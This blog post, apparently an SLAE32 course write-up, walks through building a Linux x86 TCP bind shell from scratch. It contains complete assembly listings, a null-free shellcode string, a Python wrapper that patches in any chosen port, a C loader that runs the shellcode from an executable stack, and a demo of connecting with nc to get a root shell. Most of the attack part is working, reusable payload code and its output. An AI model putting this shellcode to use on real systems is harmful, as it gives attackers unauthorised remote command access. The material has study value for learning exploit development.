---
layout: post
title: "SLAE32 - 1. TCP Bind Shell"
---

## Introduction:
The first SLAE32 exercise that required a write up was the x86 bind shell, written from scratch. As we know, or may not know, a bind shell does what it says in the name. It binds a shell. Unlike a reverse shell, the process sets up a listener on the host and waits for a connection, once accepted it fires off our new process and pipes the connection through allowing commands to be sent from a remote system and return the output. 

## Brief thoughts:
The actual implementation of the TCP bind shell was relatively straight forward. Using a C based prototype I was able to make a list of required system calls and utilise the Linux man pages to confirm the arguments and how they would need to appear and be set up within the asm file. An important thing to remember is null bytes are bad. We don't want these to exist in our final project so simple tricks were used to get around these (i.e xor'ing registers with themselves to zero them). These will be highlighted when, and where, they are used.

## Initial planning:
To begin with, I needed to know how a TCP bind shell would be implemented in C. As I had just been looking through h0mbre_'s github write ups, I remembered they included a simple one so I used this as my base reference.

```
#include <stdio.h>
#include <strings.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void) {
    int listen_sock = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;           
    server_addr.sin_addr.s_addr = INADDR_ANY;  
    server_addr.sin_port = htons(9001);        

    bind(listen_sock, (struct sockaddr *)&server_addr, sizeof(server_addr));

    listen(listen_sock, 0);

    int conn_sock = accept(listen_sock, NULL, NULL);

    dup2(conn_sock, 0);
    dup2(conn_sock, 1);
    dup2(conn_sock, 2);

    execve("/bin/sh", NULL, NULL);
}
```

Once I had this, I was easily able to highlight the required system calls and start to gather the information I need to rebuild this is assembly. Utilising the Linux man pages and the Linux headers I crafted the following table which includes the syscall name, the C declaration (including parameters, types and return values) as well as the syscall number. This information may seem a little overkill right now, but it will become obvious when implementing the calls themselves later on in this write up.

The following table lists the 6 system calls that are required to write our bind shell:  

| System Call | C Definition | Return Value | Syscall Number |
|---|:---|:---|:---|
| socket    | int socket(int domain, int type, int protocol); | File descriptor for the new socket. | 359 (0x167)    |
| bind      | int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen); | n/a | 361 (0x169) |
| listen    | int listen(int sockfd, int backlog); | n/a | 363 (0x16b) |
| accept    | int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen); | File descriptor for the new socket. | 364 (0x16c) |
| dup2      | int dup2(int oldfd, int newfd); | n/a | 63 (0x3f) |
| execve    | int execve(const char *pathname, char *const argv[], char *const envp[]); | n/a | 11 (0xb) |  
{:.mbtablestyle}

In order to create the above table, I used the following command with each syscall to obtain the C definition and return values from the linux manual pages:

``` man 2 <function_name> ```

As well as this, I used the following command to obtain the syscall value used within assembly to call the correct function:

``` cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep <function_name> ```

Crafting our shell (first draft):
First things first, we want to create the skeleton of our script (first_bind_shell.asm):

```
global   _start
section .text

_start:
        ; zero out the common registers that we are likely to use
        xor eax, eax
        xor ebx, ebx
        xor ecx, ecx
        xor edx, edx
```

With close reference to the C script included above, we can begin crafting our system calls in their required order. Ensuring the registers are set up correctly relative to the required parameters. 

The first syscall required is the socket() call. This will create our TCP socket and return a value that we must keep track of, the file descriptor.  As this is our first syscall, I will break down the function and the registers required in order to successfully call it. The function description is int socket(int domain, int type, int protocol); and as we can see, the function is used in the following manner in C int listen_sock = socket(AF_INET, SOCK_STREAM, 0);

From this we can identify the required steps in assembly from a pseudo code perspective:
* Set the EAX register to hold the value of the syscall
* Set the EBX register to hold the value of our first parameter (AF_INET)
* Set the ECX register to hold the value of our second parameter (SOCK_STREAM)
* Set the EDX register to hold the value of our third parameter (0)
* Perform the syscall
* Store the return value held in the EAX register after the syscall

Each one of these steps seems pretty simple to implement in assembly using ‘mov’ to place the correct values in the registers and ‘int 0x80’ to execute the syscall. The only information missing are the actual values for AF_INET and SOCK_STREAM, in C these are already defined with their integer values however, here we need the raw integer value.

The easiest way to get these values would have been to ask my good friend Google. He seems pretty knowledgeable but instead I thought I might as well utilise the C types and dump their raw value.

```
#include <stdio.h>
#include <sys/socket.h>

int main(void){
        printf("AF_INET: %d\n", AF_INET);
        printf("SOCK_STREAM: %d\n", SOCK_STREAM);
        return 0;
}
```

Compile and run:

```
root@kali:~/Documents/slae32/misc# gcc test.c 
root@kali:~/Documents/slae32/misc# ./a.out 
AF_INET: 2
SOCK_STREAM: 1
```

Now we have all the required information, we can set up our target registers correctly and perform our first system call to socket. Looking back at our pseudo code above, we can translate it into the following x86 assembly:

```
; SOCKET SYSCALL
; set up the registers
mov eax, 0x167
mov ebx, 0x2
mov ecx, 0x1

int 0x80              ;  execute the syscall
mov edi, eax          ;  store the return value in edi for future ref
; above pinched from h0mbre_
```

We set EAX to equal 0x167 (359), this is the value used later when the ‘int 0x80’ instruction is hit, which performs the actual syscall to socket. We now want to set up the EBX and ECX registers to hold the parameter values for our call. We set EBX to equal 0x2 (value of AF_INET), and ECX to 0x1 (value of SOCK_STREAM). We can now execute our system call.

Registers before the call:

```
gef➤  i r
eax            0x167               0x167
ecx            0x1                 0x1
edx            0x0                 0x0
ebx            0x2                 0x2
```

Registers after the call:

```
gef➤  i r
eax            0x3                 0x3
ecx            0x1                 0x1
edx            0x0                 0x0
ebx            0x2                 0x2
```

As we mentioned before. The return value for socket() is stored in the EAX. We can see above that this value is 0x3 (3). This is now our file descriptor and should be used throughout the program within some of the other system calls: 
* bind()
*  listen()
* accept()

We can safely keep track of this value by storing it in a register we are unlikely going to use, preventing the value from being corrupted and overwritten. This is done by the final instruction ‘mov edi, eax’.

Whilst writing this, I was following the execution in gdb - confirming the registers were working the way I wanted them too and the correct call was being made. Once confirmed, it was time to move on to the next syscall - bind().

Compared to the socket() system call, the bind() call requires quite a few more instructions to function correctly, including setting up the registers and pushing data onto the stack in the correct order, allowing to gain an address to use as a parameter. Looking at the C implementation of bind(), we can see 2 main sections of code include the creation of the 'server_addr struct’ and the call to bind() itself.

```
struct sockaddr_in server_addr;
server_addr.sin_family = AF_INET;           
server_addr.sin_addr.s_addr = INADDR_ANY;  
server_addr.sin_port = htons(9001);        

bind(listen_sock, (struct sockaddr *)&server_addr, sizeof(server_addr));
```

The first thing we want to do is make sure the EAX register holds the syscall number (361) ready for the execution, we can do this by placing 0x169 into the register. We then want to set our 1st parameter (EBX) to equal the file descriptor returned by the socket() function. Remember, this was stored in EDI.

We now need our 2nd parameter (ECX) to point to a collection of data in memory that includes the AF_INET, INADDR_ANY and the target port number. To break this down further, we need to obtain our raw values for the following:
* AF_INET
* INADDR_ANY
* Port value (string) in hex
* The size of the structure itself

Similar to before, I created a small C program to print these values to the screen:

```
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void){
        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_addr.s_addr = INADDR_ANY;
        server_addr.sin_port = htons(9001);

        printf("AF_INET: %d\n", server_addr.sin_family);
        printf("INADDR_ANY: %d\n", server_addr.sin_addr.s_addr);
        printf("SIZE OF: %d\n", sizeof(server_addr));
        return 0;
}
```

Compiling and executing the script gave me the following information:

```
root@kali:~/Documents/slae32/misc# ./b.out 
AF_INET: 2
INADDR_ANY: 0
SIZE OF: 16
```

Now we know the AF_INET value, the INADDR_ANY value and the size of the completed struct - we can implement our own struct, push the data onto the stack correctly and obtain the address of this collection of data. The struct itself actually contains 4 different values, which can be seen in the below definition taken from https://www.cs.cmu.edu/~srini/15-441/S10/lectures/r01-sockets.pdf:

```
struct sockaddr_in {
    short sin_family;              // e.g. AF_INET
    ‏)3490(unsigned short sin_port; // e.g. htons
    struct in_addr sin_addr;       // see struct in_addr, below 
    char sin_zero[8];              // zero this if you want to
};
```

So now we know that the data we need to structure within our assembly is the following:
* AF_INET (2)
* The port number (I used 9001 - 0x2329)
* The address (0.0.0.0 as we are locally binding)
* 0

The address of this data structure needs to be placed in the 2nd parameter (ECX), luckily the ESP currently points to this data. We need to remember that the port number is of type string, and therefore should be pushed onto the stack as a “word”. With the final addition of the size being placed into the 3rd parameter (EDX), the bind system call is ready to be executed.

```
; BIND syscall
xor eax, eax          ; zero out eax
mov eax, 0x169        ; move 361 into syscall register
mov ebx, edi          ; move fd (edi val) into ebx - param 1

; create our sockaddr struct in memory, used with bind() call, 2nd param
xor ecx, ecx
push ecx              ; 0
push ecx              ; Address (0.0.0.0)
push word 0x2923      ;  port number (9001)
push word 0x2         ;  AF_INET

mov ecx, esp          ; pointer to struct
mov edx, 16           ; size of struct
int 0x80
```

Now we are ready to implement our call to listen(). Looking at the C implementation above, listen(listen_sock, 0); we can see that we require our EBX register (1st parameter) to equal the value of our file descriptor returned from socket() and our ECX register (2nd parameter) should be equal to 0 before making our call to listen(). In addition to the parameter values, we want to make sure EAX holds the value to the correct system call (363) before calling ‘int 0x80’. This should all look like the following:

```
; LISTEN SYSCALL
xor eax, eax
mov eax, 0x16b
mov ebx, edi
xor ecx, ecx
int 0x80
```

Next we want to implement our call to accept() which will appear very similar to the listen() call above. Looking at the C implementation, we see it’s usage as int conn_sock = accept(listen_sock, NULL, NULL);. Once again, we require EAX to equal our syscall value (364), we need our first parameter (EBX) to equal our file descriptor from our socket() call, we then need our 2nd (ECX) and 3rd (EDX) parameters to both equal 0. Finally, we execute our system call with ‘int 0x80’.

```
; ACCEPT SYSCALL
xor eax, eax
mov eax, 0x16c
mov ebx, edi
xor ecx, ecx
xor edx, edx
xor esi, esi
int 0x80
```

Similar to socket(), the accept() call returns a file descriptor value to use within our final syscall, dup2(). We want to make sure we keep track of this value so we overwrite our previous file descriptor value stored in the EDI register.

```
xor edi, edi
mov edi, eax
```

The next system call we need is dup2(). The following implementation was written to replicate the C code above, so there are 3 chunks of assembly that are pretty much the same except for one value. This could be cleaned up using a loop, but at this time, I just wanted the code to work. Looking at the C implementation, we see the following:

```
dup2(conn_sock, 0);
dup2(conn_sock, 1);
dup2(conn_sock, 2);
```

Looking at this, we need 3 separate calls to dup2() with 3 different values in the 2nd parameter (0, 1 and 2). For each call, we want to make sure our EAX value holds the value of our syscall (63), the 1st parameter requires the value of our file descriptor received from the accept() call above. The 2nd parameter is the value that needs to be set to 0, 1 and 2 across the 3 seperate calls. Finally, the ‘int 0x80’ is called to execute each system call. My approach at performing these three calls can be seen below:

```
; DUP2 SYSCALL
xor eax, eax
mov eax, 0x3f
mov ebx, edi
xor ecx, ecx
int 0x80

xor eax, eax
mov eax, 0x3f
mov ebx, edi
xor ecx, ecx
mov ecx, 0x1
int 0x80

xor eax, eax
mov eax, 0x3f
mov ebx, edi
xor ecx, ecx
mov ecx, 0x2
int 0x80
```

By now, our process should have opened a socket, listened for a connection, accepted the incoming connection and set up our pipes into our process. We now want to implement our final system call, which actually gives this entire program any sense of purpose and use, the execve() call. This function allows us to execute our actual shell “/bin/sh", giving us control over the target. Within the C implementation, the execve call is used like execve("/bin/sh", NULL, NULL);. 

Before implementing this in assembly, there is something we need to remember from the manual page and our table above. The manual shows the implementation and it’s parameters as: 

```int execve(const char *pathname, char *const argv[], char *const envp[]);```

We can see that the 3 parameters all point to strings (pointers to chars/char arrays). Previously, we could simply set the value of the register to 0, however after attempting to do this for this system call I received errors during execution. After debugging the process for a little while, I tested pointing to nothing on the stack instead of simply setting the register to zero. That way, the register would be a pointer to a memory location, which held nothing. Sounds like a pointer to NULL to me! 

The final thing we need to have is the 1st parameter, which is actually the path to the file we would like to the execute. In this case, I used “/bin/sh”. This was achieved by getting the hex equivalent of this string, flipping it (Little Endian) and pushing it on the stack in 2 chunks. In step by steps, this what it looks like:
* "/bin/sh" in hex is 0x2f 0x62 0x69 0x6e 0x2f 0x73 0x68
*  we flip these because it's little endian
* we push the two chunks on separately 0x68732f6e, 0x69622f

We then need the address of the string to be placed into the first parameter (EBX). Luckily, the string is at the top of the stack and there is a register that holds this address ready for use, ESP. We can set the value of EBX to the value of ESP and achieve this. This can be completed in x86 using the following instructions:

```
push 0x68732f6e         ; hs/n
push 0x69622f2f         ; ib//
mov ebx, esp
```

Now we need our 2nd (ECX) and 3rd (EDX) parameters to point to NULL values. As I stated above, I initially attempted to just 0 out the registers - however this did not work. So I ended up pushing a zero on to the stack and using the address held in ESP again to reference the top of the stack, which pointed at our zero value after the push. This was completed twice to satisfy both NULL parameters.

Finally, I set the EAX register to the value 0xb (11), which is the value of the execve system call, and executed it with the ‘int 0x80’ instruction.

```
xor eax, eax
push eax

push 0x68732f6e
push 0x69622f2f
mov ebx, esp

push eax
mov ecx, esp

push eax
mov edx, esp

xor eax, eax
mov eax, 0xb
int 0x80
```

We should now have a fully functioning TCP bind shell, ready for assembling, linking and executing. When connecting to the bind shell, remember the port number specified in the structure created and used within the bind() system call.

I created a quick little script to help with assembling and linking my scripts, rather than having to issue 2 separate commands each time:

```
root@kali:~/Documents/slae32/misc# cat build.sh 
echo "Assembling $1.asm"
nasm -f elf32 "$1".asm 

echo "Linking $1.o"
ld -s -o "$1" "$1".o

echo "Done"
```

Usage:

```./build.sh tcp_bind_shell```

Upon assembling and linking the asm file, you should have a functional TCP bind shell.

The entire first draft script can be seen here:

```
global  _start
section .text

_start:
    ; clear out the registers by xor-ing them with themselves. 0 without null bytes
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx

    ; SOCKET SYSCALL
    ; int socket(int domain, int type, int protocol);
    ; socket is the first syscall we want with syscall number is 359 (0x167)
    ; EAX = syscall number, ebx = param 1 (2), ecx = param 2 (1), edx = param 3 (0)
    ; return's our fd value to EAX, we want to keep this
    mov eax, 0x167
    mov ebx, 0x2
    mov ecx, 0x1
    ; we don't do anything with edx as 0 already exists from the xor above

    int 0x80 ; this interrupt signal handles the syscall
    mov edi, eax ; store the return value in edi for future ref


    ; BIND syscall
    ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    xor eax, eax      ; zero out eax
    mov eax, 0x169    ; move 361 into syscall register
    mov ebx, edi      ; move fd (edi val) into ebx - param 1

    ; create our sockaddr struct in memory, used with bind() call, 2nd param
    xor ecx, ecx      ; zero out ecx
    push ecx          ; push the 0 onto the stack (4th struct value)
    push ecx          ; push the 0 onto the stack (Address)
    push word 0x2923  ; push the port onto stack  (0x2329) (PORT NUM = 9001) 
    push word 0x2     ; push 2 onto the stack     (AF_INET)

    mov ecx, esp      ; store the current stack pointer into ecx, points at struct
    mov edx, 16       ; this parameter takes the length of the addr (param 3)
    int 0x80          ; syscall 

    ; LISTEN syscall 363
    ; int listen(int sockfd, int backlog);
    xor eax, eax      ; zero out eax
    mov eax, 0x16b    ; move 363 into register (syscall number)
    mov ebx, edi      ; this should still be return val from socket() -> fd
    xor ecx, ecx      ; clean out ecx as the 2nd param value should be 0
    int 0x80          ; syscall

    ; ACCEPT syscall 364
    ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
    ; we want the return value from EAX (fd update)
    xor eax, eax      ; zero out eax
    mov eax, 0x16c    ; move 364 into register (syscall number)
    mov ebx, edi      ; this should still be return val from socket() -> fd
    xor ecx, ecx      ; zero out 2nd param (NULL)
    xor edx, edx      ; zero out 3rd param (NULL)
    xor esi, esi      ; fourth and final parameter is zero'd out
    int 0x80          ; syscall

    ; accept() returns a new fd value, so let's store this one off too
    xor edi, edi      ; 0 out edi before backing up fd
    mov edi, eax      ; back up the fd value in edi again

    ; DUP2 syscall (3 times)
    ; int dup2(int oldfd, int newfd);
    xor eax, eax      ; zero out eax
    mov eax, 0x3f     ; move 63 into register (syscall number)
    mov ebx, edi      ; move fd into 1st param (from accept)
    xor ecx, ecx      ; zero out 2nd param (0)
    int 0x80          ; syscall (1st)

    xor eax, eax      ; zero out eax
    mov eax, 0x3f     ; move 63 into register (syscall number)
    mov ebx, edi      ; move fd into 1st param (from accept)
    xor ecx, ecx      ; zero out 2nd param (0)
    mov ecx, 0x1      ; move 1 into 2nd param
    int 0x80          ; syscall (2nd)

    xor eax, eax      ; zero out eax
    mov eax, 0x3f     ; move 63 into register (syscall number)
    mov ebx, edi      ; move fd into 1st param (from accept)
    xor ecx, ecx      ; zero out 2nd param (0)
    mov ecx, 0x2      ; move 2 into 2nd param
    int 0x80          ; syscall (3rd)

    ; EXECVE() syscall
    ; int execve(const char *pathname, char *const argv[], char *const envp[]);
    ; NOTE, param 2 and 3 are pointers to strings. XOR, PUSH then point to STACK in register
    xor eax, eax      ; zero out eax ready for pushing 0s on to the stack
    push eax          ; push first zero on, align the stack?

    ; "/bin/sh" in hex is 0x2f 0x62 0x69 0x6e 0x2f 0x73 0x68
    ; we flip these because it's little endian
    ; 0x68732f6e, 0x69622f

    push 0x68732f6e
    push 0x69622f2f   ; note the // at the end, sigsevs without - junk corrupting it?
    mov ebx, esp      ; push the addr of our above string (esp) into 1st param

    push eax          ; push 0 onto the stack (2nd param == NULL)
    mov ecx, esp      ; requires a pointer - man page has them for usage

    push eax          ; push 0 onto the stack (3rd param == NULL)
    mov edx, esp      ; requires a pointer - man page has them for usage

    xor eax, eax      ; zero out eax
    mov eax, 0xb      ; move 11 into EAX register (syscall number)
    int 0x80          ; final syscall
```

After dumping the hex from the executable, I noticed that there were a tonne of null bytes within the output - which is not good for our payload. In order to remove these, a second draft needs to be looked into and come up with a way to use the same instructions with no null bytes remaining.

## Second Draft:
After playing around with the script for a while and testing a few things, I was able to narrow down the total instructions needed to still successfully create a working TCP bind shell. The instructions removed are relatively trivial, but it will help pull down the overall byte size of the hex payload. The main changes I made to the assembly were:
* removed all xor instructions used to clear a register before moving a value into it
    * I realised that the mov instruction seems to just overwrite the value, no need to 0 it
* removed the 3 separate dup2 chunks and instead added a decrementing loop, using the value of the counter as the 2nd parameter value in ECX
* when using a register to move values into them, use the lower half of the register only
    * For example, EAX becomes AL or AX (depending on the size of the value), EBX becomes BL, and so on.

The total source can be seen here:

```
global  _start
section .text

_start:
    ; SOCKET SYSCALL
    mov eax, 0x167
    mov ebx, 0x2
    mov ecx, 0x1

    int 0x80
    mov edi, eax

    ; BIND syscall
    mov eax, 0x169
    mov ebx, edi

    ; create our sockaddr struct in memory, used with bind() call, 2nd param
    xor ecx, ecx
    push ecx
    push ecx
    push word 0x2923
    push word 0x2

    mov ecx, esp
    mov edx, 16
    int 0x80

    ; LISTEN syscall 363
    mov eax, 0x16b
    mov ebx, edi
    xor ecx, ecx
    int 0x80

    ; ACCEPT syscall 364
    mov eax, 0x16c
    mov ebx, edi
    xor ecx, ecx
    xor edx, edx
    xor esi, esi
    int 0x80
    mov edi, eax         ; back up the fd value in edi again

    ; DUP2 syscall (3 times)
    mov ecx, 0x3         ; set counter register to 3 for counting down in the loop

    for_loop_dup2:
    mov eax, 0x3f
    mov ebx, edi
    dec ecx              ; decrement our counter before the syscall (should be 2, 1, 0)
    int 0x80
    
    jnz for_loop_dup2    ; if count is not 0, jump back to the start of the loop

    ; EXECVE() syscall
    xor eax, eax
    push eax

    push 0x68732f6e
    push 0x69622f2f
    mov ebx, esp

    push eax
    mov ecx, esp

    push eax
    mov edx, esp

    mov eax, 0xb
    int 0x80
```

Dumping the hex for usage:
To extract our hex values for our shell, we can use the following shell script (dump_hex.sh) along with the target object to extract the hex values in a usable fashion. The output can be taken and placed directly into the following python wrapper.

```
root@kali:~/Documents/slae32/misc# cat dump_hex.sh 
objdump -d "$1" |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
```

Usage:

```
root@kali:~/Documents/slae32/exercise_1# ../misc/dump_hex.sh second_bind_shell/second_bind_shell
"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x66\\xb8\\x69\\x01\\x89\\xfb\\x31\\xc9\\x51\\x51\\x66\\x68\\x23\\x29\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6b\\x01\\x89\\xfb\\x31\\xc9\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6c\\x01\\x89\\xfb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\xcd\\x80\\x31\\xff\\x89\\xc7\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xfe\\xc9\\xcd\\x80\\x75\\xf4\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe1\\x50\\x89\\xe2\\xb0\\x0b\\xcd\\x80"
```

As the above output shows, I have successfully tweaked my initial bind shell script to remove all null bytes during the second draft of the shell. The output also includes two \'s because the actual value, allowing direct usage within a python string. We need the two back slash characters to ensure a single \ remains in the final output.

## Custom port number:
The issue with this shell at the moment, is the static port value used within the defined struct. In order to change the port number we currently need to either open the .asm file, tweak the hex number that is pushed onto the stack and rebuild the shell or remember which hex values in the entire hex string above reference the port.

The more logical solution would be to create a little tool, or wrapper, that takes a user defined integer value, converts this value to hex and then replaces the current port number value before dumping the hex to the screen for use.

The following script is a python wrapper that I have made to allow a custom port to be placed into the script, replacing the hard coded value within the final hex output.

```
root@kali:~/Documents/slae32/exercise_1# cat wrapper.py 
import sys
import socket

shellcode = ("\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01"
        "\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x66\\xb8\\x69"
        "\\x01\\x89\\xfb\\x31\\xc9\\x51\\x51\\x66\\x68[p2][p1]\\x66\\x6a"
        "\\x02\\x89\\xe1\\xb2\\x10\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6b\\x01"
        "\\x89\\xfb\\x31\\xc9\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6c\\x01\\x89"
        "\\xfb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\xcd\\x80\\x31\\xff\\x89\\xc7"
        "\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xfe\\xc9\\xcd\\x80\\x75"
        "\\xf4\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62"
        "\\x69\\x89\\xe3\\x50\\x89\\xe1\\x50\\x89\\xe2\\xb0\\x0b\\xcd\\x80"
)

if len(sys.argv) != 2:
        print 'Usage: ' + sys.argv[0] + ' <port>'
        sys.exit()

port = sys.argv[1]
print "Chosen port: %s" % port

int_port = int(port)
if int_port > 65535:
        print "Port choice is greater than max value (65535)"
        sys.exit()

htons_port_val = socket.htons(int_port)
hex_port_value = hex(htons_port_val)

cleaned_hex_port = hex_port_value.replace("0x", "")
first_port_val = "\\x" + cleaned_hex_port[:2]
second_port_val = "\\x" + cleaned_hex_port[2:]

print "1st port: %s" % first_port_val
print "2nd port: %s" % second_port_val
print ""

print "Ammending shellcode..."

shellcode = shellcode.replace("[p2]", second_port_val)
shellcode = shellcode.replace("[p1]", first_port_val)

print "Final Shellcode:"
print shellcode
```

As we can see in the above shellcode value, there are two placeholder values [p2] and [p1], these are the two hex values that are replaced with the target port, specified at runtime. Once edited, the final shellcode is output to the screen, as seen in the following usage example:

```
root@kali:~/Documents/slae32/exercise_1# python wrapper.py 5566
Chosen port: 5566
1st port: \xbe
2nd port: \x15

Ammending shellcode...
Final Shellcode:
\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x69\x01\x89\xfb\x31\xc9\x51\x51\x66\x68\x15\xbe\x66\x6a\x02\x89\xe1\xb2\x10\xcd\x80\x31\xc0\x66\xb8\x6b\x01\x89\xfb\x31\xc9\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x31\xff\x89\xc7\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80
```

Our final step is to utilise this hex output within an executable that injects the shellcode directly into the process memory and executes it, binding out shell. This can be completed in various languages, for example C# is an ideal candidate for a Windows shell. As I am working within a Unix environment I wrote my executable in C.

```
root@kali:~/Documents/slae32/exercise_1# cat shell.c
#include<stdio.h>
#include<string.h>

unsigned char code[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x69\x01\x89\xfb\x31\xc9\x51\x51\x66\x68\x15\xbe\x66\x6a\x02\x89\xe1\xb2\x10\xcd\x80\x31\xc0\x66\xb8\x6b\x01\x89\xfb\x31\xc9\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x31\xff\x89\xc7\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80";

void main(void)
{
        printf("Shellcode Length:  %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
```

Compiling and executing:
```
root@kali:~/Documents/slae32/exercise_1# gcc -fno-stack-protector -z execstack shell.c -o shell
root@kali:~/Documents/slae32/exercise_1# ./shell 
Shellcode Length:  116

root@kali:~# nc localhost 5566
id
uid=0(root) gid=0(root) groups=0(root)
pwd
/root/Documents/slae32/exercise_1
```

## Additional:
todo